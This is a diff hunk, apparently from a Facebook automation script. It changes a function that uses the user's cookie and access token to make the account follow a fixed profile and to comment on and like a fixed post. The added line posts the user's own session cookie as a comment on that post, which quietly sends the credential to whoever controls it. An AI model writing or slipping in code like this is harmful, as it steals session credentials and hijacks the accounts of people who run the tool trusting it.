@@ -930,7 +930,7 @@ def bot_komen(cok, ken):
 		text = random.choice(['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘'])
 		r.cookies.update({'cookie': cok})
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
-		# r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
+		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={ken}')
 		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
 		r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
 		# r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
